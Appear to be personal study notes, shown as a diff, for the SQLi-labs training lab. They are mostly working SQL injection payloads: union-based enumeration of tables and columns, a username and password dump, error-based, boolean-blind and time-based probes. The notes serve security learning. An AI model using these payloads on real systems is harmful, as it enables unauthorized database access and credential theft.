@@ -1,21 +1,43 @@
-(https://resources.infosecinstitute.com/tutorial-on-sqli-labs/#gref)
-https://dev.mysql.com/doc/refman/8.0/en/columns-table.html
-https://www.techonthenet.com/mysql/functions/index.php
+https://resources.infosecinstitute.com/tutorial-on-sqli-labs/#gref) 
+https://dev.mysql.com/doc/refman/8.0/en/columns-table.html 
+https://www.techonthenet.com/mysql/functions/index.php 
 
-SQL Dumps
+https://www.w3schools.com/sql/func_mysql_substring.asp
+https://www.w3schools.com/sql/func_mysql_concat_ws.asp
+
+[SQLiDumps-Series]
 http://lab.in/sqli/Less-1/?id=-2 union select 1,2,3 -- -
 http://lab.in/sqli/Less-2/?id=-1 union select 1,2,3 -- -
 http://lab.in/sqli/Less-3/?id=-1') union select 1,2,3 -- -
-
 http://lab.in/sqli/Less-4/?id=-1") union select 1,2,3 -- -
 http://lab.in/sqli/Less-4/?id=-2") union select 1,table_name,3 from information_schema.tables where table_schema='security' -- -
-----(Fetch Table's Names)----------
+[Fetch Table's Names]
 http://lab.in/sqli/Less-4/?id=-2") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' -- -
-----(Fetch Table's Column Names)----------
+[Fetch Table's Column Names]
 http://lab.in/sqli/Less-4/?id=-2') union select 1,group_concat(table_name),group_concat(column_name) from information_schema.columns where table_schema="security" -- +
-----(Fetch Column's of Table Field DATA)----------
+[Fetch Column's of Table Field DATA]
 http://lab.in/sqli/Less-4/?id=-2") union select 1,group_concat(username),group_concat(password) from users -- +
 
+(Error Based)
+select concat(cast(database() as char))
+select concat(0x3a,cast(database() as char),0x3a)
+select (select concat(0x3a,cast(database() as char),0x3a)) from information_schema.tables where table_schema=database()
+select (select concat(0x3a,cast(database() as char),0x3a)) from information_schema.tables where table_schema=database() limit 0,1;
+(select 1 from (select count(*),concat((-----),floor(rand(0)*2))a from information_schema.tables group by a)a)
+Note: If we execute “floor(rand(0)*2)” multiple times with query it starting give error with result error
+
+http://lab.in/sqli/Less-5/?id=1' order by 4 -- -
+http://lab.in/sqli/Less-5/?id=1' OR 1 GROUP BY CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2)) HAVING MIN(0) OR 1 -- -
+http://lab.in/sqli/Less-5/?id=1' AND(select 1 from (select count(*),concat((-----),floor(rand(0)*2))a from information_schema.tables group by a)a) -- -
+
+http://lab.in/sqli/Less-6/?id=1" -- -
+http://lab.in/sqli/Less-6/?id=1" OR 1 GROUP BY CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2)) HAVING MIN(0) OR 1 -- -
+
+http://lab.in/sqli/Less-8/?id=1' and 1=1 -- -
+http://lab.in/sqli/Less-8/?id=1' and substring(database(),1,1)="s" -- -  (start-1 lett,last-1 lett)
+http://lab.in/sqli/Less-8/?id=1' and substring(database(),1,2)="se" -- - (start-1 lett,last-2 lett)
+
+http://lab.in/sqli/Less-9/?id=1' and sleep(2) and substring(database(),1,1)="s" -- -
 
 
 version() database() user() current_user 
